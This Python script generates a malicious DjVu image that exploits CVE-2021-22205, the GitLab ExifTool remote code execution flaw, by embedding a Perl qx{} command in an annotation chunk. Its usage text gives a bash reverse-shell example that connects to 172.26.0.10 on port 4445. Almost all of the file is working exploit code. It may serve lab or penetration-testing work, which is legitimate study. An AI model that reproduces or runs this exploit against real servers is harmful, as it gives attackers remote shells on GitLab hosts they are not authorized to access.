#!/usr/bin/env python3
"""
Generate a malicious image exploiting CVE-2021-22205 (GitLab ExifTool RCE).
The payload is embedded in DjVu annotation metadata that ExifTool evaluates.
"""
import struct
import sys
import os

def create_djvu_payload(command: str) -> bytes:
    """Create a DjVu file with an embedded command in metadata."""
    # The exploit abuses ExifTool's DjVu metadata parser
    # ExifTool evaluates Perl code in DjVu annotation chunks
    payload = f'(metadata\n(Copyright "\\\n" . qx{{{command}}} . ""))'
    payload_bytes = payload.encode()

    # DjVu file structure
    # AT&T magic + FORM header
    djvu = b"AT&TFORM"
    # We'll calculate total size after building content
    content = b"DJVUINFO"
    # Minimal INFO chunk (10 bytes)
    info_data = struct.pack('>HH', 100, 100)  # width, height
    info_data += b'\x18'  # 24 bpp
    info_data += b'\x00' * 5  # padding
    content += struct.pack('>I', len(info_data)) + info_data
    if len(info_data) % 2:
        content += b'\x00'

    # ANTa chunk with the payload
    content += b"ANTa"
    content += struct.pack('>I', len(payload_bytes))
    content += payload_bytes
    if len(payload_bytes) % 2:
        content += b'\x00'

    djvu += struct.pack('>I', len(content))
    djvu += content

    return djvu


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <command> <output_file>")
        print(f"Example: {sys.argv[0]} 'bash -c \"bash -i >& /dev/tcp/172.26.0.10/4445 0>&1\"' payload.jpg")
        sys.exit(1)

    command = sys.argv[1]
    output_file = sys.argv[2]

    djvu_data = create_djvu_payload(command)

    with open(output_file, 'wb') as f:
        f.write(djvu_data)

    print(f"[+] Payload image written to {output_file} ({len(djvu_data)} bytes)")
    print(f"[+] Embedded command: {command}")


if __name__ == '__main__':
    main()
